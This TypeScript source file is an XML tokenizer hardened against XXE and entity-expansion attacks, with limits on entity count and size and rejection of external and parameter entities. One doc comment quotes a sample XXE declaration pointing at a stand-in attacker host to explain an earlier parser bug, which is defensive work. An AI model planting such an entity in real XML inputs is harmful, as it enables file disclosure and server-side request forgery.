export interface XmlPoint {
  readonly offset: number
  readonly byteOffset: number
  readonly line: number
  readonly column: number
}

export interface XmlSpan {
  readonly start: XmlPoint
  readonly end: XmlPoint
}

export interface XmlAttributeToken {
  readonly name: string
  readonly value: string
  readonly quote: '"' | "'"
  readonly nameSpan: XmlSpan
  readonly valueSpan: XmlSpan
}

export interface XmlEntityDeclaration {
  readonly name: string
  readonly value: string
  readonly quote: '"' | "'"
  readonly span: XmlSpan
}

export interface XmlDeclarationToken {
  readonly kind: 'xml-declaration'
  readonly raw: string
  readonly span: XmlSpan
  readonly version: string | null
  readonly encoding: string | null
  readonly standalone: string | null
}

export interface XmlDoctypeToken {
  readonly kind: 'doctype'
  readonly raw: string
  readonly span: XmlSpan
  readonly name: string
  readonly externalIdKind: 'system' | 'public' | null
  readonly externalIdLiteral: string | null
  readonly internalSubset: string | null
  readonly entityDeclarations: readonly XmlEntityDeclaration[]
}

export interface XmlStartTagToken {
  readonly kind: 'start-tag' | 'empty-tag'
  readonly raw: string
  readonly span: XmlSpan
  readonly name: string
  readonly attributes: readonly XmlAttributeToken[]
}

export interface XmlEndTagToken {
  readonly kind: 'end-tag'
  readonly raw: string
  readonly span: XmlSpan
  readonly name: string
}

export interface XmlTextToken {
  readonly kind: 'text' | 'comment' | 'cdata' | 'processing-instruction'
  readonly raw: string
  readonly span: XmlSpan
  readonly content: string
  readonly target?: string
}

export interface XmlElementNode {
  readonly kind: 'element'
  readonly name: string
  readonly startTag: XmlStartTagToken
  readonly endTag: XmlEndTagToken | null
  readonly children: readonly XmlNode[]
}

export interface XmlLeafNode {
  readonly kind: 'text' | 'comment' | 'cdata' | 'processing-instruction'
  readonly token: XmlTextToken
}

export type XmlNode = XmlElementNode | XmlLeafNode

export type XmlToken =
  | XmlDeclarationToken
  | XmlDoctypeToken
  | XmlStartTagToken
  | XmlEndTagToken
  | XmlTextToken

export interface TokenizedXmlDocument {
  readonly tokens: readonly XmlToken[]
  readonly children: readonly XmlNode[]
  readonly declaration: XmlDeclarationToken | null
  readonly doctype: XmlDoctypeToken | null
  readonly rootElementName: string | null
  readonly maxDepth: number
  readonly nodeCount: number
}

export interface XmlTokenizerLimits {
  readonly maxTokens: number
  readonly maxEntityDeclarations: number
  readonly maxEntityValueLength: number
  readonly maxTotalEntityValueLength: number
}

export const DEFAULT_XML_TOKENIZER_LIMITS: XmlTokenizerLimits = Object.freeze({
  maxTokens: 200_000,
  maxEntityDeclarations: 128,
  maxEntityValueLength: 8_192,
  maxTotalEntityValueLength: 65_536
})

export type XmlTokenizerErrorCode =
  | 'token-limit'
  | 'malformed-xml'
  | 'malformed-nesting'
  | 'duplicate-attribute'
  | 'invalid-encoding'
  | 'external-entity'
  | 'entity-limit'
  | 'cancelled'

export class XmlTokenizerError extends Error {
  readonly code: XmlTokenizerErrorCode
  readonly offset: number

  constructor(code: XmlTokenizerErrorCode, message: string, offset: number) {
    super(message)
    this.name = 'XmlTokenizerError'
    this.code = code
    this.offset = offset
  }
}

interface Cursor {
  index: number
  byteOffset: number
  line: number
  column: number
}

interface MutableXmlElementNode {
  kind: 'element'
  name: string
  startTag: XmlStartTagToken
  endTag: XmlEndTagToken | null
  children: XmlNode[]
}

function isNameStartChar(char: string): boolean {
  return /[:A-Z_a-z]/u.test(char)
}

function isNameChar(char: string): boolean {
  return /[:A-Z_a-z0-9.\-]/u.test(char)
}

function isWhitespace(char: string): boolean {
  return char === ' ' || char === '\n' || char === '\r' || char === '\t'
}

function utf8ByteLength(codePoint: number): number {
  if (codePoint <= 0x7f) return 1
  if (codePoint <= 0x7ff) return 2
  if (codePoint <= 0xffff) return 3
  return 4
}

function clonePoint(cursor: Cursor): XmlPoint {
  return {
    offset: cursor.index,
    byteOffset: cursor.byteOffset,
    line: cursor.line,
    column: cursor.column
  }
}

function span(start: XmlPoint, cursor: Cursor): XmlSpan {
  return {
    start,
    end: clonePoint(cursor)
  }
}

function throwTokenizerError(
  code: XmlTokenizerErrorCode,
  message: string,
  cursor: Cursor
): never {
  throw new XmlTokenizerError(code, message, cursor.index)
}

function advanceTo(text: string, cursor: Cursor, targetIndex: number): void {
  while (cursor.index < targetIndex) {
    const code = text.charCodeAt(cursor.index)
    if (code === 13) {
      if (text.charCodeAt(cursor.index + 1) === 10) {
        cursor.index += 2
        cursor.byteOffset += 2
      } else {
        cursor.index += 1
        cursor.byteOffset += 1
      }
      cursor.line += 1
      cursor.column = 1
      continue
    }
    if (code === 10) {
      cursor.index += 1
      cursor.byteOffset += 1
      cursor.line += 1
      cursor.column = 1
      continue
    }
    const codePoint = text.codePointAt(cursor.index) ?? code
    const width = codePoint > 0xffff ? 2 : 1
    cursor.index += width
    cursor.byteOffset += utf8ByteLength(codePoint)
    cursor.column += 1
  }
}

function readName(text: string, cursor: Cursor): { name: string; start: XmlPoint } {
  const start = clonePoint(cursor)
  const first = text[cursor.index]
  if (!first || !isNameStartChar(first)) {
    throwTokenizerError('malformed-xml', 'Expected an XML name.', cursor)
  }
  let index = cursor.index + 1
  while (index < text.length && isNameChar(text[index]!)) index += 1
  const name = text.slice(cursor.index, index)
  advanceTo(text, cursor, index)
  return { name, start }
}

function skipWhitespace(text: string, cursor: Cursor): void {
  while (cursor.index < text.length && isWhitespace(text[cursor.index]!)) {
    advanceTo(text, cursor, cursor.index + 1)
  }
}

function readQuotedValue(
  text: string,
  cursor: Cursor
): { value: string; quote: '"' | "'"; valueSpan: XmlSpan } {
  const quote = text[cursor.index]
  if (quote !== '"' && quote !== "'") {
    throwTokenizerError('malformed-xml', 'Expected a quoted XML attribute value.', cursor)
  }
  advanceTo(text, cursor, cursor.index + 1)
  const valueStart = clonePoint(cursor)
  const close = text.indexOf(quote, cursor.index)
  if (close === -1) {
    throwTokenizerError('malformed-xml', 'Unterminated XML attribute value.', cursor)
  }
  const value = text.slice(cursor.index, close)
  advanceTo(text, cursor, close)
  const valueSpan = span(valueStart, cursor)
  advanceTo(text, cursor, cursor.index + 1)
  return { value, quote, valueSpan }
}

function parseXmlDeclaration(
  text: string,
  cursor: Cursor
): XmlDeclarationToken {
  const start = clonePoint(cursor)
  advanceTo(text, cursor, cursor.index + 5)
  const attributes = new Map<string, string>()
  skipWhitespace(text, cursor)
  while (!text.startsWith('?>', cursor.index)) {
    const { name } = readName(text, cursor)
    skipWhitespace(text, cursor)
    if (text[cursor.index] !== '=') {
      throwTokenizerError('malformed-xml', 'Expected "=" in XML declaration.', cursor)
    }
    advanceTo(text, cursor, cursor.index + 1)
    skipWhitespace(text, cursor)
    const { value } = readQuotedValue(text, cursor)
    attributes.set(name, value)
    skipWhitespace(text, cursor)
    if (cursor.index >= text.length) {
      throwTokenizerError('malformed-xml', 'Unterminated XML declaration.', cursor)
    }
  }
  advanceTo(text, cursor, cursor.index + 2)
  const encoding = attributes.get('encoding') ?? null
  if (encoding !== null && !/^[A-Za-z][A-Za-z0-9._-]*$/u.test(encoding)) {
    throw new XmlTokenizerError(
      'invalid-encoding',
      `Declared XML encoding "${encoding}" is invalid.`,
      start.offset
    )
  }
  return {
    kind: 'xml-declaration',
    raw: text.slice(start.offset, cursor.index),
    span: { start, end: clonePoint(cursor) },
    version: attributes.get('version') ?? null,
    encoding,
    standalone: attributes.get('standalone') ?? null
  }
}

function parseProcessingInstruction(text: string, cursor: Cursor): XmlTextToken {
  const start = clonePoint(cursor)
  advanceTo(text, cursor, cursor.index + 2)
  const { name } = readName(text, cursor)
  const close = text.indexOf('?>', cursor.index)
  if (close === -1) {
    throwTokenizerError('malformed-xml', 'Unterminated processing instruction.', cursor)
  }
  const content = text.slice(cursor.index, close).trim()
  advanceTo(text, cursor, close + 2)
  return {
    kind: 'processing-instruction',
    raw: text.slice(start.offset, cursor.index),
    span: { start, end: clonePoint(cursor) },
    content,
    target: name
  }
}

function parseComment(text: string, cursor: Cursor): XmlTextToken {
  const start = clonePoint(cursor)
  const close = text.indexOf('-->', cursor.index + 4)
  if (close === -1) {
    throwTokenizerError('malformed-xml', 'Unterminated XML comment.', cursor)
  }
  const content = text.slice(cursor.index + 4, close)
  advanceTo(text, cursor, close + 3)
  return {
    kind: 'comment',
    raw: text.slice(start.offset, cursor.index),
    span: { start, end: clonePoint(cursor) },
    content
  }
}

function parseCdata(text: string, cursor: Cursor): XmlTextToken {
  const start = clonePoint(cursor)
  const close = text.indexOf(']]>', cursor.index + 9)
  if (close === -1) {
    throwTokenizerError('malformed-xml', 'Unterminated CDATA section.', cursor)
  }
  const content = text.slice(cursor.index + 9, close)
  advanceTo(text, cursor, close + 3)
  return {
    kind: 'cdata',
    raw: text.slice(start.offset, cursor.index),
    span: { start, end: clonePoint(cursor) },
    content
  }
}

const ENTITY_NAME_RE = /^[A-Za-z_][A-Za-z0-9_.:-]*/u

function isInternalSubsetWhitespace(char: string | undefined): boolean {
  return char === ' ' || char === '\n' || char === '\r' || char === '\t'
}

/**
 * Scan an internal DOCTYPE subset for `<!ENTITY ...>` declarations.
 *
 * This is a hand-written scanner rather than a single regular expression on
 * purpose: a prior regex-based implementation only matched the *malformed*
 * external-entity shape `<!ENTITY name SYSTEM>` (missing the mandatory
 * quoted identifier). Real XXE payloads always include that identifier —
 * `<!ENTITY xxe SYSTEM "http://attacker.example/evil.dtd">` — which the old
 * regex silently failed to match at all, so `matchAll` skipped straight past
 * the declaration instead of rejecting it. Any syntax this scanner does not
 * explicitly recognize as a safe, bounded, internal-value declaration is
 * rejected (fail closed) rather than silently ignored.
 */
function parseInternalEntities(
  internalSubset: string | null,
  limits: XmlTokenizerLimits,
  start: XmlPoint
): readonly XmlEntityDeclaration[] {
  if (!internalSubset) return Object.freeze([])
  const declarations: XmlEntityDeclaration[] = []
  let totalValueLength = 0
  let index = 0

  const skipWhitespace = (): void => {
    while (index < internalSubset.length && isInternalSubsetWhitespace(internalSubset[index])) index += 1
  }

  while (index < internalSubset.length) {
    const declStart = internalSubset.indexOf('<!ENTITY', index)
    if (declStart === -1) break
    index = declStart + '<!ENTITY'.length
    skipWhitespace()

    // Parameter entities (`<!ENTITY % name ...>`) are not needed by ARIS
    // AML/XML and are the primary mechanism behind out-of-band/"blind" XXE
    // and DTD-based expansion attacks. Reject them outright, whether their
    // declared value would itself have been external or internal.
    if (internalSubset[index] === '%' && isInternalSubsetWhitespace(internalSubset[index + 1])) {
      throw new XmlTokenizerError(
        'external-entity',
        'Parameter XML entities are not allowed.',
        start.offset
      )
    }

    const nameMatch = ENTITY_NAME_RE.exec(internalSubset.slice(index))
    if (!nameMatch) {
      throw new XmlTokenizerError(
        'malformed-xml',
        'Malformed <!ENTITY> declaration: expected an entity name.',
        start.offset
      )
    }
    const name = nameMatch[0]
    index += name.length
    skipWhitespace()

    const looksLikeSystem =
      internalSubset.startsWith('SYSTEM', index) && isInternalSubsetWhitespace(internalSubset[index + 'SYSTEM'.length])
    const looksLikePublic =
      internalSubset.startsWith('PUBLIC', index) && isInternalSubsetWhitespace(internalSubset[index + 'PUBLIC'.length])
    if (looksLikeSystem || looksLikePublic) {
      throw new XmlTokenizerError(
        'external-entity',
        'External XML entities are not allowed.',
        start.offset
      )
    }

    const quote = internalSubset[index]
    if (quote !== '"' && quote !== "'") {
      throw new XmlTokenizerError(
        'malformed-xml',
        `Malformed <!ENTITY ${name}> declaration: expected a quoted value or an external identifier.`,
        start.offset
      )
    }
    index += 1
    const closeQuoteIndex = internalSubset.indexOf(quote, index)
    if (closeQuoteIndex === -1) {
      throw new XmlTokenizerError(
        'malformed-xml',
        `Unterminated <!ENTITY ${name}> value.`,
        start.offset
      )
    }
    const value = internalSubset.slice(index, closeQuoteIndex)
    index = closeQuoteIndex + 1
    skipWhitespace()
    if (internalSubset[index] !== '>') {
      throw new XmlTokenizerError(
        'malformed-xml',
        `Malformed <!ENTITY ${name}> declaration: expected ">".`,
        start.offset
      )
    }
    index += 1

    if (declarations.length >= limits.maxEntityDeclarations) {
      throw new XmlTokenizerError(
        'entity-limit',
        `The document declares more than ${limits.maxEntityDeclarations} XML entities.`,
        start.offset
      )
    }
    if (value.length > limits.maxEntityValueLength) {
      throw new XmlTokenizerError(
        'entity-limit',
        `An XML entity value exceeds the ${limits.maxEntityValueLength}-character limit.`,
        start.offset
      )
    }
    if (/&[A-Za-z_][A-Za-z0-9_.:-]*;/u.test(value)) {
      throw new XmlTokenizerError(
        'entity-limit',
        'Nested XML entity expansion is not allowed.',
        start.offset
      )
    }
    totalValueLength += value.length
    if (totalValueLength > limits.maxTotalEntityValueLength) {
      throw new XmlTokenizerError(
        'entity-limit',
        `Total XML entity replacement text exceeds the ${limits.maxTotalEntityValueLength}-character limit.`,
        start.offset
      )
    }
    declarations.push({
      name,
      value,
      quote,
      span: {
        start,
        end: start
      }
    })
  }
  return Object.freeze(declarations)
}

function parseDoctype(
  text: string,
  cursor: Cursor,
  limits: XmlTokenizerLimits
): XmlDoctypeToken {
  const start = clonePoint(cursor)
  advanceTo(text, cursor, cursor.index + '<!DOCTYPE'.length)
  skipWhitespace(text, cursor)
  const { name } = readName(text, cursor)
  const bodyStart = cursor.index
  let quote: '"' | "'" | null = null
  let bracketDepth = 0
  while (cursor.index < text.length) {
    const char = text[cursor.index]!
    if (quote) {
      if (char === quote) quote = null
      advanceTo(text, cursor, cursor.index + 1)
      continue
    }
    if (char === '"' || char === "'") {
      quote = char
      advanceTo(text, cursor, cursor.index + 1)
      continue
    }
    if (char === '[') {
      bracketDepth += 1
      advanceTo(text, cursor, cursor.index + 1)
      continue
    }
    if (char === ']') {
      if (bracketDepth > 0) bracketDepth -= 1
      advanceTo(text, cursor, cursor.index + 1)
      continue
    }
    if (char === '>' && bracketDepth === 0) {
      break
    }
    advanceTo(text, cursor, cursor.index + 1)
  }
  if (cursor.index >= text.length || text[cursor.index] !== '>') {
    throwTokenizerError('malformed-xml', 'Unterminated DOCTYPE declaration.', cursor)
  }
  const declarationBody = text.slice(bodyStart, cursor.index)
  const prolog = declarationBody.replace(/\[[\s\S]*$/u, '').trim()
  const publicMatch = prolog.match(/\bPUBLIC\s+(["'])([\s\S]*?)\1\s+(["'])([\s\S]*?)\3/u)
  const systemMatch = prolog.match(/\bSYSTEM\s+(["'])([\s\S]*?)\1/u)
  const subsetMatch = declarationBody.match(/\[([\s\S]*)\]\s*$/u)
  const internalSubset = subsetMatch?.[1] ?? null
  advanceTo(text, cursor, cursor.index + 1)
  return {
    kind: 'doctype',
    raw: text.slice(start.offset, cursor.index),
    span: { start, end: clonePoint(cursor) },
    name,
    externalIdKind: publicMatch ? 'public' : systemMatch ? 'system' : null,
    externalIdLiteral: publicMatch ? publicMatch[4] ?? null : systemMatch ? systemMatch[2] ?? null : null,
    internalSubset,
    entityDeclarations: parseInternalEntities(internalSubset, limits, start)
  }
}

function parseText(text: string, cursor: Cursor): XmlTextToken {
  const start = clonePoint(cursor)
  const next = text.indexOf('<', cursor.index)
  const end = next === -1 ? text.length : next
  const content = text.slice(cursor.index, end)
  advanceTo(text, cursor, end)
  return {
    kind: 'text',
    raw: text.slice(start.offset, cursor.index),
    span: { start, end: clonePoint(cursor) },
    content
  }
}

function parseEndTag(text: string, cursor: Cursor): XmlEndTagToken {
  const start = clonePoint(cursor)
  advanceTo(text, cursor, cursor.index + 2)
  const { name } = readName(text, cursor)
  skipWhitespace(text, cursor)
  if (text[cursor.index] !== '>') {
    throwTokenizerError('malformed-xml', 'Unterminated XML end tag.', cursor)
  }
  advanceTo(text, cursor, cursor.index + 1)
  return {
    kind: 'end-tag',
    raw: text.slice(start.offset, cursor.index),
    span: { start, end: clonePoint(cursor) },
    name
  }
}

function parseStartTag(text: string, cursor: Cursor): XmlStartTagToken {
  const start = clonePoint(cursor)
  advanceTo(text, cursor, cursor.index + 1)
  const { name } = readName(text, cursor)
  const attributes: XmlAttributeToken[] = []
  const seen = new Set<string>()
  while (cursor.index < text.length) {
    skipWhitespace(text, cursor)
    if (text.startsWith('/>', cursor.index)) {
      advanceTo(text, cursor, cursor.index + 2)
      return {
        kind: 'empty-tag',
        raw: text.slice(start.offset, cursor.index),
        span: { start, end: clonePoint(cursor) },
        name,
        attributes: Object.freeze(attributes)
      }
    }
    if (text[cursor.index] === '>') {
      advanceTo(text, cursor, cursor.index + 1)
      return {
        kind: 'start-tag',
        raw: text.slice(start.offset, cursor.index),
        span: { start, end: clonePoint(cursor) },
        name,
        attributes: Object.freeze(attributes)
      }
    }
    const attributeStart = clonePoint(cursor)
    const { name: attributeName, start: nameStart } = readName(text, cursor)
    if (seen.has(attributeName)) {
      throw new XmlTokenizerError(
        'duplicate-attribute',
        `Duplicate XML attribute "${attributeName}" is not allowed.`,
        attributeStart.offset
      )
    }
    seen.add(attributeName)
    skipWhitespace(text, cursor)
    if (text[cursor.index] !== '=') {
      throwTokenizerError('malformed-xml', 'Expected "=" after an XML attribute name.', cursor)
    }
    advanceTo(text, cursor, cursor.index + 1)
    skipWhitespace(text, cursor)
    const { value, quote, valueSpan } = readQuotedValue(text, cursor)
    attributes.push({
      name: attributeName,
      value,
      quote,
      nameSpan: { start: nameStart, end: clonePoint(cursor) },
      valueSpan
    })
  }
  throwTokenizerError('malformed-xml', 'Unterminated XML start tag.', cursor)
}

const PREDEFINED_XML_ENTITIES: Readonly<Record<string, string>> = Object.freeze({
  amp: '&',
  lt: '<',
  gt: '>',
  apos: "'",
  quot: '"'
})

const ENTITY_REFERENCE_RE = /&(#x[0-9A-Fa-f]+|#[0-9]+|[A-Za-z_][A-Za-z0-9_.:-]*);/gu

/**
 * Expand predefined XML entities, numeric character references, and
 * declared internal entities in previously tokenized raw text/attribute
 * content. This is a lossless-architecture-safe operation: `raw` spans
 * recorded by the tokenizer are never mutated, and this function only ever
 * produces a *new* string for callers that need decoded content (e.g. the
 * semantic index layer).
 *
 * A single, non-recursive replacement pass is sufficient and safe: entity
 * *declarations* are rejected outright by {@link parseInternalEntities} if
 * their value contains a reference to another entity, so a declared value
 * can never itself expand further (expansion depth is bounded at 1).
 */
export function expandXmlEntities(
  raw: string,
  entityDeclarations: readonly XmlEntityDeclaration[] = []
): string {
  const custom = new Map(entityDeclarations.map((declaration) => [declaration.name, declaration.value]))
  return raw.replace(ENTITY_REFERENCE_RE, (match, reference: string) => {
    if (reference.startsWith('#x') || reference.startsWith('#X')) {
      const codePoint = Number.parseInt(reference.slice(2), 16)
      return Number.isFinite(codePoint) ? String.fromCodePoint(codePoint) : match
    }
    if (reference.startsWith('#')) {
      const codePoint = Number.parseInt(reference.slice(1), 10)
      return Number.isFinite(codePoint) ? String.fromCodePoint(codePoint) : match
    }
    const predefined = PREDEFINED_XML_ENTITIES[reference]
    if (predefined !== undefined) return predefined
    const declared = custom.get(reference)
    if (declared !== undefined) return declared
    return match
  })
}

function resolvedLimits(limits?: Partial<XmlTokenizerLimits>): XmlTokenizerLimits {
  return {
    maxTokens: limits?.maxTokens ?? DEFAULT_XML_TOKENIZER_LIMITS.maxTokens,
    maxEntityDeclarations:
      limits?.maxEntityDeclarations ?? DEFAULT_XML_TOKENIZER_LIMITS.maxEntityDeclarations,
    maxEntityValueLength:
      limits?.maxEntityValueLength ?? DEFAULT_XML_TOKENIZER_LIMITS.maxEntityValueLength,
    maxTotalEntityValueLength:
      limits?.maxTotalEntityValueLength ?? DEFAULT_XML_TOKENIZER_LIMITS.maxTotalEntityValueLength
  }
}

export function tokenizeXmlDocument(
  text: string,
  limits?: Partial<XmlTokenizerLimits>,
  signal?: AbortSignal
): TokenizedXmlDocument {
  const resolved = resolvedLimits(limits)
  const cursor: Cursor = { index: 0, byteOffset: 0, line: 1, column: 1 }
  const checkCancellation = (): void => {
    if (signal?.aborted) {
      throw new XmlTokenizerError('cancelled', 'XML tokenization was cancelled.', cursor.index)
    }
  }
  checkCancellation()
  const tokens: XmlToken[] = []
  const openElements: string[] = []
  const openElementNodes: MutableXmlElementNode[] = []
  const documentChildren: XmlNode[] = []
  let declaration: XmlDeclarationToken | null = null
  let doctype: XmlDoctypeToken | null = null
  let rootElementName: string | null = null
  let maxDepth = 0
  let nodeCount = 0

  if (text.startsWith('\uFEFF')) advanceTo(text, cursor, 1)

  const pushToken = (token: XmlToken): void => {
    if (tokens.length >= resolved.maxTokens) {
      throw new XmlTokenizerError(
        'token-limit',
        `The XML tokenizer exceeded the ${resolved.maxTokens}-token limit.`,
        token.span.start.offset
      )
    }
    tokens.push(token)
  }

  const appendNode = (node: XmlNode): void => {
    nodeCount += 1
    const parent = openElementNodes[openElementNodes.length - 1]
    if (parent) parent.children.push(node)
    else documentChildren.push(node)
  }

  const freezeNode = (node: XmlNode): XmlNode => {
    if (node.kind === 'element') {
      return Object.freeze({
        ...node,
        children: Object.freeze(node.children.map((child) => freezeNode(child)))
      })
    }
    return Object.freeze(node)
  }

  while (cursor.index < text.length) {
    checkCancellation()
    const remaining = text.slice(cursor.index)
    if (remaining.startsWith('<?xml')) {
      if (declaration !== null || tokens.some((token) => token.kind !== 'text' || token.content.trim())) {
        throwTokenizerError(
          'malformed-xml',
          'XML declaration must appear only once at the start of the document.',
          cursor
        )
      }
      declaration = parseXmlDeclaration(text, cursor)
      pushToken(declaration)
      continue
    }
    if (remaining.startsWith('<!--')) {
      const token = parseComment(text, cursor)
      pushToken(token)
      appendNode({ kind: 'comment', token })
      continue
    }
    if (remaining.startsWith('<![CDATA[')) {
      const token = parseCdata(text, cursor)
      pushToken(token)
      appendNode({ kind: 'cdata', token })
      continue
    }
    if (remaining.startsWith('<?')) {
      const token = parseProcessingInstruction(text, cursor)
      pushToken(token)
      appendNode({ kind: 'processing-instruction', token })
      continue
    }
    if (remaining.startsWith('<!DOCTYPE')) {
      if (doctype !== null) {
        throwTokenizerError('malformed-xml', 'DOCTYPE may appear only once.', cursor)
      }
      doctype = parseDoctype(text, cursor, resolved)
      pushToken(doctype)
      continue
    }
    if (remaining.startsWith('</')) {
      const token = parseEndTag(text, cursor)
      const expected = openElements.pop()
      const currentNode = openElementNodes.pop()
      if (expected !== token.name) {
        throw new XmlTokenizerError(
          'malformed-nesting',
          `Closing tag </${token.name}> does not match the current open element.`,
          token.span.start.offset
        )
      }
      if (!currentNode || currentNode.name !== token.name) {
        throw new XmlTokenizerError(
          'malformed-nesting',
          `Closing tag </${token.name}> does not match the current open element node.`,
          token.span.start.offset
        )
      }
      currentNode.endTag = token
      pushToken(token)
      continue
    }
    if (remaining.startsWith('<')) {
      const token = parseStartTag(text, cursor)
      if (openElements.length === 0) {
        if (rootElementName !== null) {
          throw new XmlTokenizerError(
            'malformed-xml',
            'XML documents may contain only one root element.',
            token.span.start.offset
          )
        }
        rootElementName = token.name
      }
      if (token.kind === 'start-tag') {
        openElements.push(token.name)
        const node: MutableXmlElementNode = {
          kind: 'element',
          name: token.name,
          startTag: token,
          endTag: null,
          children: []
        }
        appendNode(node as unknown as XmlNode)
        openElementNodes.push(node)
        maxDepth = Math.max(maxDepth, openElements.length)
      } else {
        appendNode({
          kind: 'element',
          name: token.name,
          startTag: token,
          endTag: null,
          children: []
        })
        maxDepth = Math.max(maxDepth, openElements.length + 1)
      }
      pushToken(token)
      continue
    }
    const token = parseText(text, cursor)
    pushToken(token)
    appendNode({ kind: 'text', token })
  }

  if (openElements.length > 0) {
    throw new XmlTokenizerError(
      'malformed-nesting',
      `Element <${openElements[openElements.length - 1]}> is not closed.`,
      cursor.index
    )
  }

  return Object.freeze({
    tokens: Object.freeze(tokens),
    children: Object.freeze(documentChildren.map((node) => freezeNode(node))),
    declaration,
    doctype,
    rootElementName,
    maxDepth,
    nodeCount
  })
}
